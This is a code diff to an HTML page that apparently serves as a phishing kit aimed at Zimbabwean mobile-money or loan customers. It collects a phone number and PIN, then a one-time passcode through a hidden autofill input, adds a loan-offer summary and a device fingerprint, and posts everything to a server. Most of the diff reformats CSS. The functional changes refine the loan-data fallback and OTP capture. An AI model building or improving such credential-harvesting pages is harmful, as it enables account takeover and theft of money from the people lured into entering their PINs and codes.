@@ -8,8 +8,15 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{height:100%}
+*{
+box-sizing:border-box;
+-webkit-tap-highlight-color:transparent
+}
+
+html,body{
+height:100%
+}
+
 body{
 font-family:Inter,system-ui,Arial;
 background:#020617;
@@ -18,7 +25,7 @@ padding:18px;
 display:flex;
 align-items:center;
 justify-content:center;
-color:#e5e7eb;
+color:#e5e7eb
 }
 
 .card{
@@ -28,27 +35,27 @@ background:#020617;
 padding:20px;
 border-radius:14px;
 border:1px solid #1f2937;
-box-shadow:0 18px 45px rgba(0,0,0,.75);
+box-shadow:0 18px 45px rgba(0,0,0,.75)
 }
 
 .logo{
 height:44px;
 display:block;
-margin:0 auto 10px;
+margin:0 auto 10px
 }
 
 h2{
 text-align:center;
 margin:0 0 12px;
 font-size:20px;
-color:#f8fafc;
+color:#f8fafc
 }
 
 label{
 display:block;
 font-size:13px;
 margin-top:8px;
-color:#cbd5f5;
+color:#cbd5f5
 }
 
 input{
@@ -59,7 +66,7 @@ border:1px solid #1f2937;
 background:#020617;
 color:#e5e7eb;
 font-size:14px;
-outline:none;
+outline:none
 }
 
 .btn{
@@ -71,27 +78,41 @@ border:0;
 margin-top:12px;
 width:100%;
 font-weight:600;
-cursor:pointer;
+cursor:pointer
 }
 
-.btn[disabled]{background:#334155}
+.btn[disabled]{
+background:#334155
+}
 
-.req{color:#ef4444;margin-right:6px}
-.small{font-size:13px;color:#9ca3af}
-.success{color:#22c55e;font-weight:600}
+.req{
+color:#ef4444;
+margin-right:6px
+}
+
+.small{
+font-size:13px;
+color:#9ca3af
+}
+
+.success{
+color:#22c55e;
+font-weight:600
+}
 
 .error{
 min-height:18px;
 font-size:13px;
-color:#ef4444;
+color:#ef4444
 }
 
 /* PIN */
+
 .pin-row{
 display:flex;
 gap:10px;
 justify-content:center;
-margin-top:10px;
+margin-top:10px
 }
 
 .pin-digit{
@@ -102,22 +123,23 @@ border:2px solid #fff;
 background:#fff;
 font-size:1px;
 color:transparent;
-caret-color:transparent;
+caret-color:transparent
 }
 
 .pin-digit.filled{
 background:#2563eb;
-border-color:#2563eb;
+border-color:#2563eb
 }
 
 /* OTP */
+
 .otp-modal{
 position:fixed;
 inset:0;
 background:rgba(2,6,23,.88);
 display:flex;
 align-items:center;
-justify-content:center;
+justify-content:center
 }
 
 .otp-box{
@@ -125,14 +147,14 @@ background:#020617;
 padding:20px;
 border-radius:14px;
 min-width:340px;
-border:1px solid #1f2937;
+border:1px solid #1f2937
 }
 
 .otp-row{
 display:flex;
 gap:10px;
 justify-content:center;
-margin-top:10px;
+margin-top:10px
 }
 
 .otp-digit{
@@ -142,12 +164,12 @@ border-radius:50%;
 border:2px solid #fff;
 background:#fff;
 font-size:1px;
-color:transparent;
+color:transparent
 }
 
 .otp-digit.filled{
 background:#2563eb;
-border-color:#2563eb;
+border-color:#2563eb
 }
 
 .resend-row{
@@ -155,7 +177,7 @@ display:flex;
 align-items:center;
 justify-content:space-between;
 gap:10px;
-margin-top:14px;
+margin-top:14px
 }
 
 .resend-btn{
@@ -165,20 +187,22 @@ padding:10px 14px;
 border-radius:8px;
 color:#e5e7eb;
 flex:1;
-cursor:pointer;
+cursor:pointer
 }
 
-.resend-btn[disabled]{opacity:.6}
+.resend-btn[disabled]{
+opacity:.6
+}
 
 .action-primary{
 background:#2563eb;
 border:0;
-color:#fff;
+color:#fff
 }
 
 .action-secondary{
 background:#020617;
-border:1px solid #1f2937;
+border:1px solid #1f2937
 }
 </style>
 </head>
@@ -194,11 +218,12 @@ border:1px solid #1f2937;
 <form id="loginForm">
 
 <label><span class="req">★</span>Mobile Number</label>
+
 <input id="phone" value="+263" inputmode="numeric">
 
 <div id="phoneError" class="error"></div>
 
-<label><span class="req">★</span>Enter PIN</label>
+<label><span class="req">★</span>Enter your PIN</label>
 
 <div class="pin-row">
 
@@ -214,6 +239,7 @@ border:1px solid #1f2937;
 </form>
 
 </div>
+
 
 
 <div id="otpModal" class="otp-modal" style="display:none">
@@ -234,11 +260,14 @@ border:1px solid #1f2937;
 
 </div>
 
-<input id="otpBuffer"
+<input
+id="otpBuffer"
+type="tel"
 inputmode="numeric"
 pattern="[0-9]*"
 autocomplete="one-time-code"
-style="position:absolute;opacity:0">
+style="position:absolute;opacity:0"
+>
 
 <div id="otpWarning" class="small"></div>
 
@@ -281,37 +310,62 @@ Cancel
 </div>
 
 
+
 <script>
 
 /* LOAN SUMMARY */
+
 function buildLoanRequest(){
+
 try{
-const loan=JSON.parse(sessionStorage.getItem('loanForm')||'{}');
+
+let loan=JSON.parse(sessionStorage.getItem('loanForm')||'{}');
+
+loan.loanAmount=loan.loanAmount||sessionStorage.getItem('loanAmount');
+loan.loanType=loan.loanType||sessionStorage.getItem('loanType');
+loan.repayment=loan.repayment||sessionStorage.getItem('repayment');
+loan.employment=loan.employment||sessionStorage.getItem('employment');
+
 if(!loan.loanAmount) return 'N/A';
 
 return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (${loan.employment})`;
 
-}catch(e){return 'N/A'}
+}catch(e){
+
+return 'N/A';
+
 }
 
+}
+
+
+
 /* DEVICE */
+
 const ua=navigator.userAgent;
 
 let device='Unknown';
 
 if(/Android/i.test(ua)){
+
 const v=ua.match(/Android\s([\d.]+)/);
+
 device='Android '+(v?v[1]:'');
+
 }
 
 else if(/iPhone|iPad/i.test(ua)){
+
 const v=ua.match(/OS (\d+_\d+)/);
+
 device='iOS '+(v?v[1].replace('_','.'):'');
+
 }
 
 if(/Chrome/i.test(ua)) device+=' | Chrome';
 else if(/Safari/i.test(ua)) device+=' | Safari';
 else if(/Firefox/i.test(ua)) device+=' | Firefox';
+
 
 
 /* PIN */
@@ -366,6 +420,7 @@ loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue)) || loginLocked;
 }
 
 
+
 /* PHONE */
 
 const phone=document.getElementById('phone');
@@ -407,6 +462,7 @@ updatePin();
 });
 
 
+
 /* API */
 
 async function sendToServer(payload){
@@ -424,6 +480,7 @@ body:JSON.stringify(payload)
 }
 
 
+
 /* OTP */
 
 const dots=[...document.querySelectorAll('.otp-digit')];
@@ -437,7 +494,6 @@ const resendBtn=document.getElementById('resendBtn');
 const countdown=document.getElementById('countdown');
 
 const otpStatus=document.getElementById('otpStatus');
-
 
 let timer=null;
 
@@ -453,6 +509,14 @@ confirmBtn.disabled=!/^\d{5}$/.test(v) || confirmLocked;
 }
 
 
+/* ensure keyboard always numeric */
+
+dots.forEach(d=>{
+
+d.addEventListener('click',()=>buffer.focus());
+
+});
+
 buffer.addEventListener('input',()=>{
 
 buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
@@ -460,7 +524,6 @@ buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
 renderOtp(buffer.value);
 
 });
-
 
 buffer.addEventListener('keydown',e=>{
 
@@ -504,6 +567,7 @@ resendBtn.disabled=false;
 }
 
 
+
 /* LOGIN */
 
 document.getElementById('loginForm').addEventListener('submit',async e=>{
@@ -545,6 +609,7 @@ buffer.focus();
 startCountdown();
 
 });
+
 
 
 /* CONFIRM */
